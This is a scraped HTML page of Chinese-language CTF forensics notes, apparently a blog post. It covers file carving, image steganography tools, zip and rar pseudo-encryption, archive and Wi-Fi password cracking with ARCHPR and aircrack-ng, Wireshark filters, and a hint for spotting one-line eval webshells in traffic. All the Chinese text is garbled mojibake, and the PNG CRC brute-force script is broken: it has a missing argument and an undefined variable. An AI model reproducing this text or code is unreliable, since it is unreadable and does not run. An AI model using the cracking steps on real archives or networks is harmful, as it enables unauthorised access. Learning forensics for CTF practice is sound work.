id="æ–‡ä»¶ç±»å‹è¯†åˆ«">æ–‡ä»¶ç±»å‹è¯†åˆ«</span></h3><ol><li>fileå‘½ä»¤<ul><li>ä½¿ç”¨åœºæ™¯ï¼šä¸çŸ¥é“åç¼€ï¼Œæ— æ³•æ‰“å¼€æ–‡ä»¶</li></ul></li><li>winhex<ul><li>ä½¿ç”¨åœºæ™¯ï¼šwindowsä¸‹é€šè¿‡æ–‡ä»¶å¤´ä¿¡æ¯åˆ¤æ–­æ–‡ä»¶ç±»å‹</li></ul></li></ol><ul><li>é‡åˆ°é¢˜ç›®ç»™ä¸ª.pngæ–‡ä»¶ï¼Œä½†æ˜¯æ‰“ä¸å¼€ï¼Œé€šè¿‡<code>file</code>å‘½ä»¤è¯†åˆ«å‘ç°æ˜¯dataçš„æƒ…å†µï¼Œéœ€è¦ä¿®å¤ã€‚<ul><li>é€šè¿‡010 Editoråœ¨æ–‡ä»¶åŠ ä¸Šå¯¹åº”å¤´éƒ¨å°±è¡Œã€‚</li></ul></li></ul><ol start="3"><li><p>010 Editor</p><p>é‡åˆ°éƒ½æ˜¯16è¿›åˆ¶ç¼–ç çš„æ–‡æœ¬ï¼Œå¯ä»¥é€šè¿‡import hexå¯¼å…¥ã€‚</p></li></ol><h3><span id="æ–‡ä»¶åˆ†ç¦»æ“ä½œ">æ–‡ä»¶åˆ†ç¦»æ“ä½œ</span></h3><ol><li><p>Binwalkå·¥å…·</p><p>ç”¨æ³•ï¼š</p><p>åˆ†ææ–‡ä»¶: binwalk filename</p><p>åˆ†ç¦»æ–‡ä»¶: binwalk -e filename</p></li><li><p>formost</p><ul><li>å¦‚æœBinwalkæ²¡åŠæ³•åˆ†ç¦»ï¼Œå¯ä»¥ä½¿ç”¨å®ƒ</li></ul><p>ç”¨æ³•ï¼š</p><p>Foremost filename -o dir</p></li><li><p>dd</p><ul><li>å¦‚æœæ˜¯åˆ†å—çš„è¯ï¼Œå‰ä¸¤ä¸ªå·¥å…·éƒ½ä¸ç®¡ç”¨ï¼Œå°±ä½¿ç”¨å®ƒæŠŠã€‚</li></ul><p>ç”¨æ³•ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span> =<span class="number">1</span>.txt of=<span class="number">4</span>.txt bs=<span class="number">5</span> count=<span class="number">3</span> skip=<span class="number">1</span></span><br><span class="line"># inputfile outputfile blocksize </span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åˆ†æˆå‡ å—åˆé€‚çš„è¯ï¼Œéœ€è¦å€ŸåŠ©binwalkåˆ†æ</p></li></ol><h3><span id="æ–‡ä»¶åˆå¹¶æ“ä½œ">æ–‡ä»¶åˆå¹¶æ“ä½œ</span></h3><ol><li><p>Linuxä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat a b c ... &gt; dist</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®Œæ•´æ€§æ£€æŸ¥</span></span><br><span class="line">md5sum filename</span><br></pre></td></tr></table></figure></li><li><p>Windowsä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> /B a+b+c dist</span><br><span class="line"># å¦‚æœå‰ç¼€ä¸€æ ·</span><br><span class="line"><span class="built_in">copy</span> /B prefix* dist</span><br><span class="line"># å®Œæ•´æ ¡éªŒ</span><br><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure></li></ol><h2><span id="å›¾ç‰‡éšå†™">å›¾ç‰‡éšå†™</span></h2><ol><li><p>ç»†å¾®é¢œè‰²åŒºåˆ«</p></li><li><p>GIFå›¾å¤šå¸§éšè—</p><ol><li>é¢œè‰²é€šé“éšè—</li><li>ä¸åŒå¸§å›¾ä¿¡æ¯éšè—</li><li>ä¸åŒå¸§å¯¹æ¯”éšå†™</li></ol></li><li><p>Exifä¿¡æ¯éšè—</p><p>é€šè¿‡å±æ€§å¯ä»¥çœ‹åˆ°ä¿¡æ¯</p></li><li><p>å›¾ç‰‡ä¿®å¤</p><ol><li>å›¾ç‰‡å¤´ä¿®å¤</li><li>å›¾ç‰‡å°¾ä¿®å¤</li><li>CRCæ ¡éªŒä¿®å¤</li><li>é•¿ã€å®½ã€é«˜ä¿®å¤</li></ol></li><li><p>æœ€ä½æœ‰æ•ˆä½LSBéšå†™</p></li><li><p>å›¾ç‰‡åŠ å¯†</p><ol><li>Stegdetect</li><li>outguess</li><li>Jphide</li><li>F5</li></ol></li></ol><ul><li><p><strong>Firework</strong>ï¼š</p><blockquote><p>ä½¿ç”¨010 Editoræ‰“å¼€æ–‡ä»¶æ—¶ä¼šçœ‹åˆ°æ–‡ä»¶å¤´åŒ…å«fireworkæ ‡è¯†ï¼Œé€šè¿‡fireworkå¯ä»¥æ‰¾åˆ°éšè—å›¾ç‰‡ã€‚</p></blockquote></li><li><p><strong>Stegsolve</strong>:</p><blockquote><p>ä¸¤å¼ å›¾ç‰‡ä¹‹é—´åšè¿ç®—<em>XOR&#x2F;SUB&#x2F;ADD</em></p><p>å¯ä»¥ç»„åˆçŒœæµ‹LSBï¼Œä½†æ˜¯æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨ç‚¹å‡»</p></blockquote></li><li><p><strong>Zsteg</strong>:</p><blockquote><p>ç›´æ¥æ’åˆ—ç»„åˆæ‰€æœ‰LSBç»“æœ</p></blockquote></li><li><p><strong>wbstego4</strong>:</p><blockquote><p>å¯ä»¥è§£å¯†.bmp&#x2F;pdfæ–‡ä»¶ï¼Œéœ€è¦å…ˆè½¬bmp</p></blockquote></li><li><p><strong>pythonè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">  im = PIL.Image.<span class="built_in">open</span>(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">  im2 = im.copy()</span><br><span class="line">  pix = im2.load()</span><br><span class="line">  wid,hei = im2.size</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,wid):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>,hei):</span><br><span class="line">      <span class="keyword">if</span> pix[x,y]&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">        pix[x,y]=<span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        pix[x,y]=<span class="number">255</span></span><br><span class="line"> im2.show()</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p><strong>TweakPNG</strong>ï¼š</p><ul><li>â€‹CRCé”™è¯¯</li></ul><blockquote><p>å®ƒå¯ä»¥ä¿®æ”¹å’ŒæŸ¥çœ‹ä¸€äº›PNGå›¾åƒæ–‡ä»¶çš„å…ƒä¿¡æ¯å­˜å‚¨ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è¯¥è½¯ä»¶ä¿®æ”¹ï¼Œæœç´¢è½¯ä»¶æç¤ºé”™è¯¯å€¼çš„crcå€¼æ›¿æ¢æˆæ­£ç¡®çš„å³å¯ã€‚</p></blockquote><ul><li>å›¾ç‰‡å®½é«˜é”™è¯¯</li></ul><blockquote><p>éœ€è¦é€šè¿‡CRCè®¡ç®—å‡ºæ­£ç¡®çš„å®½é«˜</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc_current = <span class="string">&#x27;0x08ec7edb&#x27;</span> <span class="comment"># ç›®å‰çš„å°±è¡Œï¼Œä¸æ˜¯æç¤ºçš„æ­£ç¡®çš„</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&#x27;xxx.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == crc_current:</span><br><span class="line">      <span class="built_in">print</span>(i,j)</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure></li></ul><h3><span id="å›¾ç‰‡åŠ å¯†">å›¾ç‰‡åŠ å¯†</span></h3><ul><li><p>Bftools</p><blockquote><p>åœ¨winä¸‹ç”¨äºå¯¹åŠ å¯†è¿‡çš„å›¾ç‰‡è¿›è¡Œè§£å¯†æ“ä½œ</p></blockquote></li><li><p>SilentEye</p><blockquote><p>å¯ä»¥å°†æ–‡å­—æ–‡ä»¶éšè—åˆ°å›¾ç‰‡ï¼Œæˆ–è€…å¯¹å›¾ç‰‡è¿›è¡Œè§£å¯†çš„å·¥å…·</p></blockquote></li><li><p>Stegdetect</p><blockquote><p>ä¸»è¦ç”¨äºæ£€æµ‹å›¾ç‰‡ä½¿ç”¨å“ªäº›éšå†™å·¥å…·éšè—ä¿¡æ¯</p></blockquote></li><li><p>Jphide</p><blockquote><p>åŸºäºæœ€ä½æœ‰æ•ˆä½LSBçš„å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>Outguess</p><blockquote><p>å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>F5</p><blockquote><p>å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>CQR</p><blockquote><p>äºŒç»´ç å¤„ç†</p></blockquote></li></ul><p><strong>äºŒç»´ç å¤„ç†ï¼š</strong></p><ol><li>è¡¥å…¨ï¼Œå¯èƒ½äºŒç»´ç çš„æ–¹å—è¢«æŒ¡ä½äº†ï¼Œæˆ‘ä»¬éœ€è¦è®²èµ·è¡¥å…¨å³å¯</li><li>å–åï¼šä½¿ç”¨ç”»å›¾å·¥å…·çš„åè‰² åŠŸèƒ½<ul><li>å¦‚æœæ˜¯å½©è‰²å›¾ç‰‡å¯ä»¥ç”¨<strong>Stegsolve</strong>æŸ¥çœ‹é¢œè‰²é€šé“è¿›è¡Œæ‰«ç ï¼Œå¦‚æœè¿˜æ²¡åŠæ³•æ‰«å‡ºæ¥å¯ä»¥å…ˆåè‰²å†æ‰«ã€‚</li></ul></li></ol><h2><span id="å‹ç¼©æ–‡ä»¶å¤„ç†">å‹ç¼©æ–‡ä»¶å¤„ç†</span></h2><h3><span id="åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼">åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼</span></h3><p><strong>ä¼ªåŠ å¯†ï¼š</strong></p><blockquote><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º 00 00 ï¼ˆ50 4B 03 04 14 00 åï¼‰<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º 09 00  ï¼ˆ50 4B 01 02 14 00 åï¼‰</p></blockquote><p> <strong>çœŸåŠ å¯†ï¼š</strong></p><blockquote><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º09 00 ï¼ˆ50 4B 03 04 14 00 åï¼‰ </p><p>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º09 00 ï¼ˆ50 4B 01 02 14 00 åï¼‰ </p></blockquote><ol><li><p>ä¼ªåŠ å¯†</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> ä¼ªåŠ å¯†æ–‡ä»¶</p></li></ol><p><strong>æ“ä½œæ–¹æ³•ï¼š</strong>ä½¿ç”¨winhexæ‰“å¼€å‹ç¼©æ–‡ä»¶ï¼Œæ‰¾åˆ°æ–‡ä»¶å¤´ç¬¬ä¹ç¬¬åä¸ªå­—ç¬¦ï¼Œå°†å…¶ä¿®æ”¹ä¸º0000</p><p>   1.ä½¿ç”¨winhexæ‰“å¼€æ–‡ä»¶æœç´¢16è¿›åˆ¶504B0102ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªåŠ å¯†æ–‡ä»¶çš„æ–‡ä»¶å¤´å­—æ®µã€‚</p><p>   <font color="orange"><strong>RARæ–‡ä»¶</strong></font>ç”±äºæœ‰å¤´éƒ¨æ ¡éªŒï¼Œä½¿ç”¨ä¼ªåŠ å¯†æ—¶æ‰“å¼€æ–‡ä»¶ä¼šå‡ºç°æŠ¥é”™ï¼Œä½¿ç”¨winhexä¿®æ”¹æ ‡å¿—ä½åå¦‚æŠ¥é”™æ¶ˆå¤±ç›®æ­£å¸¸è§£å‹ç¼©ï¼Œè¯´æ˜æ˜¯ä¼ªåŠ å¯†ã€‚ä½¿ç”¨winhexæ‰“å¼€RARæ–‡ä»¶ï¼Œæ‰¾åˆ°ç¬¬24ä¸ªå­—èŠ‚ï¼Œè¯¥å­—èŠ‚å°¾æ•°ä¸º4è¡¨ç¤ºåŠ å¯†ï¼Œ0è¡¨ç¤ºæ— åŠ å¯†ï¼Œå°†å°¾æ•°æ”¹ä¸º0å³å¯ç ´è§£ä¼ªåŠ å¯†</p><ol start="2"><li><p>æš´åŠ›ç ´è§£</p><p>é€šå¸¸æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ARCHPR.exeå·¥å…·æ¥ç ´è§£raræ–‡ä»¶ï¼Œç”¨Ziperelloæ¥ç ´è§£zip</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong>windowsä¸‹åŠ å¯†è¿‡çš„zipæ–‡ä»¶</p><ol><li><p>æ”»å‡»ç±»å‹é€‰æ‹©æš´åŠ›ç ´è§£ï¼Œåœ¨èŒƒå›´ä½ç½®æ ¹æ®æç¤ºé€‰æ‹©æš´åŠ›ç ´è§£èŒƒå›´é€‰é¡¹è®¾ç½®æš´åŠ›ç ´è§£åŒ…å«çš„ç±»å‹å¼€å§‹äºå’Œç»“æŸäºé€‰é¡¹å…·ä½“èŒƒå›´ï¼Œå¦‚æœæ²¡æœ‰å®šä¹‰åˆ™å…¨èŒƒå›´æš´åŠ›ç ´è§£ã€‚ç‚¹å‡»æ‰“å¼€é€‰æ‹©è¦ç ´è§£çš„æ–‡ä»¶ï¼Œç‚¹å‡»å¼€å§‹è¿›è¡Œç ´è§£ã€‚å»ºè®®ä½¿ç”¨1~9ä½çš„æ•°å­—å¯†ç ï¼Œä»¥åŠç³»ç»Ÿ è‡ªå¸¦çš„è‹±æ–‡å­—å…¸ä½œä¸ºå¯†ç å­—å…¸ã€‚</p></li><li><p>æ”»å‡»ç±»å‹é€‰æ‹©æ©ç å¯ä»¥è¿›è¡Œå¤æ‚çš„æš´åŠ›ç ´è§£æ¯”å¦‚çŸ¥é“å¯†ç å‰3ä½æ˜¯abcï¼Œå3ä½ä¸ºæ•°å­—ï¼Œåˆ™åœ¨æ”»å‡»ç±»å‹é€‰æ‹©æ©ç ï¼Œåœ¨æ©ç å¤„è¾“å…¥acb???ï¼Œæš´åŠ›èŒƒå›´é€‰é¡¹é€‰æ‹©æ‰€æœ‰æ•°å­—ï¼Œæ‰“å¼€è¦ç ´è§£çš„ç‚¹å‡»ï¼Œç‚¹å‡»ç ´è§£ã€‚æ­¤æ—¶?? ?çš„éƒ¨åˆ†ä¼šè¢«æˆ‘ä»¬é€‰æ‹©çš„æš´åŠ›ç ´è§£èŒƒå›´ä¸­çš„å­—ç¬¦ä»£æ›¿ã€‚</p></li><li><p>æœ‰æ—¶ä¸ä¸€å®šèƒ½ç ´è§£å‡ºæ–‡ä»¶å£ä»¤ï¼Œä½†æ˜¯èƒ½å¤Ÿæ‰¾åˆ°åŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ï¼Œå¯ä»¥ç›´æ¥å°†æ–‡ä»¶è§£å¯†ï¼Œç‚¹å‡»ç¡®å®šä¿å­˜è§£å¯†åçš„æ–‡ä»¶</p></li></ol><p>ä½¿ç”¨è¯¥æ–¹æ³•éœ€è¦æ³¨æ„ä¸¤ä¸ªå…³é”®ç‚¹:<br>1ã€æœ‰ä¸€ä¸ªæ˜æ–‡æ–‡ä»¶ï¼Œå‹ç¼©åCRCå€¼ä¸åŠ å¯†å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ä¸€è‡´ã€‚<br>2ã€æ˜æ–‡æ–‡ä»¶çš„å‹ç¼©ç®—æ³•éœ€è¦ä¸åŠ å¯†å‹ç¼©æ–‡ä»¶çš„å‹ç¼©ç®—æ³•ä¸€è‡´ã€‚</p></li><li><p>æ–‡ä»¶åˆ†æ</p><p>æœ‰æ—¶å€™ç»™çš„RARæ–‡ä»¶å¤´éƒ¨å„ä¸ªå­—å—ä¼šæ•…æ„ç»™é”™å¯¼è‡´æ— æ³•è¯†åˆ«ï¼ˆéšè—æ–‡ä»¶ï¼‰</p><table><thead><tr><th>å­—æ®µ</th><th>å¤§å°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>HEAD CRC</td><td>2 å­—èŠ‚</td><td>æ‰€æœ‰å—æˆ–å—éƒ¨åˆ†çš„CRC</td></tr><tr><td>HEAD TYPE</td><td>1 å­—èŠ‚</td><td>å—ç±»å‹</td></tr><tr><td>HEAD FLAGS</td><td>2 å­—èŠ‚</td><td>å—æ ‡è®°</td></tr><tr><td>HEAD SIZE</td><td>2 å­—èŠ‚</td><td>å—å¤§å° #å¦‚æœå—æ ‡è®°çš„ç¬¬ä¸€ä½è¢«ç½®1çš„è¯ï¼Œè¿˜å­˜åœ¨</td></tr><tr><td>ADD SIZE</td><td>4 å­—èŠ‚</td><td>å¯é€‰ç»“æ„ - å¢åŠ å—å¤§å°</td></tr></tbody></table><p>é‚£ä¹ˆï¼Œæ–‡ä»¶å—çš„<strong>ç¬¬3ä¸ªå­—èŠ‚ä¸ºå—ç±»å‹ï¼Œä¹Ÿå«å¤´ç±»å‹</strong></p><p> å¤´ç±»å‹æ˜¯0x72è¡¨ç¤ºæ˜¯æ ‡è®°å—</p><p>å¤´ç±»å‹æ˜¯0x73è¡¨ç¤ºæ˜¯å‹ç¼©æ–‡ä»¶å¤´å—</p><p>å¤´ç±»å‹æ˜¯0x74è¡¨ç¤ºæ˜¯<strong>æ–‡ä»¶å¤´</strong>å—</p><p>å¤´ç±»å‹æ˜¯0x75è¡¨ç¤ºæ˜¯æ³¨é‡Šå¤´</p></li></ol><h2><span id="æµé‡åˆ†æ">æµé‡åˆ†æ</span></h2><blockquote><p>CTF æ¯”èµ›ä¸­ï¼Œæµé‡åŒ…çš„å–è¯åˆ†ææ˜¯å¦ä¸€é¡¹é‡è¦çš„è€ƒå¯Ÿæ–¹å‘ã€‚<br>é€šå¸¸æ¯”èµ›ä¸­ä¼šæä¾›ä¸€ä¸ªåŒ…å«æµé‡æ•°æ®çš„PCAP æ–‡ä»¶ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šéœ€è¦é€‰æ‰‹ä»¬å…ˆè¿›è¡Œä¿®å¤æˆ–é‡æ„ä¼ è¾“æ–‡ä»¶åï¼Œå†è¿›è¡Œåˆ†æã€‚</p></blockquote><ul><li><p>æ€»ä½“æŠŠæ¡</p><ul><li>åè®®åˆ†çº§</li><li>ç«¯ç‚¹ç»Ÿè®¡</li></ul></li><li><p>è¿‡æ»¤ç­›é€‰</p><ul><li>è¿‡æ»¤è¯­æ³•</li><li>Hostï¼ŒProtocolï¼Œcontainsï¼Œç‰¹å¾å€¼</li></ul></li><li><p>å‘ç°å¼‚å¸¸</p><ul><li>ç‰¹æ®Šå­—ç¬¦ä¸²</li><li>åè®®æŸå­—æ®µ</li><li>flag ä½äºæœåŠ¡å™¨ä¸­</li></ul></li><li><p>æ•°æ®æå–</p><ul><li>å­—ç¬¦ä¸²å–</li><li>æ–‡ä»¶æå–</li></ul></li><li><p><strong>æ€»çš„æ¥è¯´æ¯”èµ›ä¸­çš„æµé‡åˆ†æå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ–¹å‘:</strong></p><ul><li>æµé‡åŒ…ä¿®å¤</li><li>åè®®åˆ†æ</li><li>æ•°æ®æå–</li></ul></li></ul><p>å¸¸ç”¨çš„è¿‡æ»¤å‘½ä»¤ï¼š</p><ol><li><p>è¿‡æ»¤IPï¼Œå¦‚æºIPæˆ–è€…ç›®æ ‡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤ç«¯å£</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line">tcp.dstport == 80 <span class="comment"># åªæ˜¾ç¤ºtcpç›®æ ‡åœ°å€80ç«¯å£</span></span><br><span class="line">tcp.srcport == 80 <span class="comment"># åªæ˜¾ç¤ºtcpç›®æ ‡åœ°å€80ç«¯å£</span></span><br><span class="line">tcp.port &gt;=1 and tcp.port &lt;=80</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤åè®®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp/udp/arp/icmp/http/ftp/dns/ip...</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤MAC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst == xx:xx:...</span><br></pre></td></tr></table></figure></li><li><p>åŒ…é•¿åº¦è¿‡æ»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length == 26 <span class="comment"># è¿™ä¸ªé•¿åº¦æ˜¯æŒ‡udpæœ¬èº«å›ºå®šé•¿åº¦8åŠ ä¸Šudpä¸‹é¢é‚£å—æ•°æ®åŒ…ä¹‹å’Œ</span></span><br><span class="line">tcp.len &gt;=7 <span class="comment">#æŒ‡çš„æ˜¯ipæ•°æ®åŒ…ï¼ˆtcpä¸‹é¢é‚£å—æ•°æ®ï¼‰ï¼Œä¸åŒ…æ‹¬tcpæœ¬èº«</span></span><br><span class="line">ip.len == 94 <span class="comment">#é™¤äº†ä»¥å¤ªç½‘å¤´å›ºå®šé•¿åº¦14ï¼Œå…¶ä»–éƒ½ç®—ip.lenï¼Œå³ä»ipæœ¬èº«åˆ°æœ€å</span></span><br><span class="line">frame.len == 119 <span class="comment">#æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œä»ethå¼€å§‹åˆ°æœ€å</span></span><br></pre></td></tr></table></figure></li><li><p>httpæ¨¡å¼è¿‡æ»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http.request.method ==<span class="string">&quot;GET&quot;</span></span><br><span class="line">http.request.method ==<span class="string">&quot;POST&quot;</span></span><br><span class="line">http.request.uri == <span class="string">&quot;/img/logo-edu.gif&quot;</span></span><br><span class="line">http contains <span class="string">&quot;GET&quot;</span></span><br><span class="line">http contains <span class="string">&quot;HTTP/1.&quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;GET&quot;</span> &amp;&amp; http contains <span class="string">&quot;User-Agent:&quot;</span></span><br><span class="line">http contains <span class="string">&quot;flag&quot;</span></span><br><span class="line">http contains <span class="string">&quot;key&quot;</span></span><br><span class="line">tcp contains <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åè®®åˆ†æ</p><blockquote><p>Statistics-&gt;Protocal Hierarchy</p><p>Apply as filter-&gt;selected</p></blockquote></li><li><p>æµæ±‡èš</p><blockquote><p>é€‰ä¸­ä¸€æ¡åï¼Œè¿½è¸ªæµ</p></blockquote><ul><li>HTMLä¸­ç›´æ¥åŒ…å«é‡è¦ä¿¡æ¯</li><li>ä¸Šä¼ æˆ–è€…ä¸‹è½½æ–‡ä»¶å†…å®¹ï¼Œé€šå¸¸åŒ…å«æ–‡ä»¶åã€hashå€¼ç­‰å…³é”®ä¿¡æ¯ï¼Œå¸¸ç”¨POSTè¯·æ±‚ä¸Šä¼ </li><li>ä¸€å¥è¯æœ¨é©¬ï¼ŒPOSTè¯·æ±‚ï¼Œå†…å®¹åŒ…å«evalï¼Œä½¿ç”¨base64åŠ å¯†</li></ul></li><li><p>æ•°æ®æå–</p><p>è‡ªåŠ¨æå–</p><blockquote><p>æ–‡ä»¶-&gt;å¯¼å‡ºå¯¹è±¡-ã€‹http</p></blockquote><p>æ‰‹åŠ¨æå–å†…å®¹</p><blockquote><p>ç‚¹å‡»æƒ³è¦çš„æ•°æ®åŒ…ï¼Œé€‰å®šmedia typeçš„ä½ç½®</p><p>å³é”®-&gt;å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ</p><p>æ–‡ä»¶-&gt;å‡ºåˆ†ç»„å­—èŠ‚æµ</p><p>é€‰æ‹©ä¿å­˜äºŒè¿›åˆ¶</p></blockquote></li><li><p>æ— çº¿wifiæµé‡åŒ…</p><ol><li>ç”¨aircrack-ngæ£€æŸ¥capåŒ…ï¼š<code>aircrack-ng xxx.cap</code></li><li>è·‘å­—å…¸<code>aircarck-ng xxx.cap -w pass.txt</code></li></ol></li><li><p>USBæµé‡</p><ol><li><p>é”®ç›˜</p><blockquote><p>å¯ä»¥å°†è¯¥åŸŸçš„å€¼åœ¨ä¸»é¢æ¿ä¸Šæ˜¾ç¤ºï¼Œé”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬3ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usbpacket .</p></blockquote><p>a. ç¬¬ä¸€ç§æ–¹æ³•ï¼šå¯¼å‡ºåˆ†ç»„è§£æç»“æœ-&gt;ä¸ºcsv</p></li></ol><p>â€‹   b. ç¬¬äºŒç§æ–¹æ³•ï¼šä½¿ç”¨wsæä¾›çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œapply as column ç„¶åtshark</p><p>â€‹  <code>tshark -r usb1.pap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>â€‹      c. ç”¨è„šæœ¬å»åˆ†æ</p><ol start="2"><li><p>é¼ æ ‡</p><blockquote><p>é¼ æ ‡æµé‡ä¸é”®ç›˜æµé‡ä¸åŒï¼Œé¼ æ ‡ç§»åŠ¨æ—¶è¡¨ç°ä¸ºè¿ç»­æ€§ï¼Œä¸é”®ç›˜çš„ç¦»æ•£æ€§ä¸ä¸€æ ·ã€‚ä½†æ˜¯å®é™…é¼ æ ‡äº§ç”Ÿçš„æ•°æ®æ˜¯ç¦»æ•£çš„ã€‚æ‰€ä»¥åŒæ ·å¯ä»¥æŠŠæ•°æ®æŠ“å–å‡ºæ¥ï¼Œæ„æˆäºŒç»´åæ ‡ç”»å‡ºè½¨è¿¹ã€‚</p><p>é¼ æ 